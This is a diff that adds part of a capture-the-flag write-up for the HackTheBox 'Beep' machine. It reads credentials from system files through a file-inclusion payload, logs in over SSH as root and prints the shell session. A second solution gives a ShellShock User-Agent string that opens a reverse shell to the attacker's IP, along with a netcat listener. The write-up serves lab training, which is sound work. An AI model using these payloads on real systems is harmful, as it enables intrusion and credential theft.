@@ -369,3 +369,133 @@ I used the above mentioned module, and looking at the module, i found out the pa
 
 here, `/etc/amportal.conf` is the system file in the Elastix software.
 
+So I visited the web-page, entered the payload, executed it and this is what I get.
+
+![bp-5](https://user-images.githubusercontent.com/87711310/211778610-ef428b7f-03e9-4c5f-9cbc-6ddcf678f8f5.png)
+
+It was unreadable so I tried viewing the source-code of the page hoping that it might have the code with proper indentation and formatting and here's what i got.
+
+![bp-6](https://user-images.githubusercontent.com/87711310/211778602-d7efa8e0-df30-478b-a32a-2e4578d090b7.png)
+
+After going through the source-code, I found the credentials for the `admin` user.
+
+![bp-7](https://user-images.githubusercontent.com/87711310/211778608-07cbfbb1-be1e-4d74-875b-2df7e281d389.png)
+
+And i'm in `index.php` or `admin's dashboard`
+
+![bp-8](https://user-images.githubusercontent.com/87711310/211779417-1020d1e7-c849-4cbb-ba83-10eadf041502.png)
+
+So now I tried to ssh into system using `admin's credentials` but I couldn't
+
+So using the same payload, I tried to look at the contents of `/etc/passwd` to get the list of the users on the machine
+
+![bp-9](https://user-images.githubusercontent.com/87711310/211780984-27efca25-c799-44f0-a7b5-a900905df446.png)
+
+And after filtering through the results, these are the ones I could use.
+
+```
+root:x:0:0:root:/root:/bin/bash
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
+cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
+asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
+spamfilter:x:500:500::/home/spamfilter:/bin/bash
+fanis:x:501:501::/home/fanis:/bin/bash
+```
+
+And since `admin` is similar to `root`, I tried ssh-ing to the `root` user with the admin's credentials we retrieve.
+
+So whule logging in as root through `ssh` i encountered an unusual error.
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/beep]
+└─$ ssh root@10.10.10.7      
+Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 
+```
+
+After restarting the box, connecting to the VPN again after disconnecting it, I googled the issue and found a quick fix
+
+```
+sh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa root@10.10.10.7 
+```
+
+You just had to exchange the diffie-hellman and rsa keys with the IP.
+After doing this and entering the password, I was in!!!
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/beep]
+└─$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa root@10.10.10.7 
+The authenticity of host '10.10.10.7 (10.10.10.7)' can't be established.
+RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.7' (RSA) to the list of known hosts.
+root@10.10.10.7's password: 
+Last login: Tue Jul 16 11:45:47 2019
+
+Welcome to Elastix 
+----------------------------------------------------
+
+To access your Elastix System, using a separate workstation (PC/MAC/Linux)
+Open the Internet Browser using the following URL:
+http://10.10.10.7
+
+[root@beep ~]# whoami
+root
+
+```
+
+Obtaining the `user` and `root` flag is very simple from here on!
+
+```
+[root@beep ~]# whoami
+root
+[root@beep ~]# pwd
+/root
+[root@beep ~]# cat root.txt
+[REDACTED]
+[root@beep ~]# cd home
+-bash: cd: home: No such file or directory
+[root@beep ~]# ls
+anaconda-ks.cfg  elastix-pr-2.2-1.i386.rpm  install.log  install.log.syslog  postnochroot  root.txt  webmin-1.570-1.noarch.rpm
+[root@beep ~]# cd ..
+[root@beep /]# ls
+bin  boot  dev  etc  home  lib  lost+found  media  mnt  opt  proc  root  sbin  selinux  srv  sys  tftpboot  tmp  usr  var
+[root@beep /]# cd home
+[root@beep home]# ls
+fanis  spamfilter
+[root@beep home]# cd fanis
+[root@beep fanis]# ls
+user.txt
+[root@beep fanis]# cat user.txt
+[REDACTED]
+```
+
+
+
+## Solution 2
+This attack works on web server involving port `10000`
+
+First, visit the webmin application.
+
+Then intercept the request in Burp and send it to Repeater. Change the User Agent field to the following string
+
+```
+() { :;}; bash -i >& /dev/tcp/<Your IP>/4444 0>&1
+```
+![bp-10](https://user-images.githubusercontent.com/87711310/211785051-18da65c1-47e8-42d8-856f-276fe272cf3f.png)
+
+What that does is it exploits the ShellShock vulnerability and sends a reverse shell back to our attack machine. If you’re not familiar with ShellShock, the following image explains it really well.
+
+
+![bp-12](https://user-images.githubusercontent.com/87711310/211785043-8b111ce7-3a4d-4ba5-9231-39ae83653c8d.png)
+
+Once you've sent the request to Repeater and changed the `User-Agent` to the given string, set up a listener to receive a reverse shell.
+
+```
+nc -lvnp
+```
+
+Once you hit send to the request from the Repeaterm checking on the listener you had set up, you see a root shell
+
+![bp-11](https://user-images.githubusercontent.com/87711310/211785058-47a3fa0d-4826-4d9c-88b1-736b8d672921.png)
+
+You can now retrieve the flag.
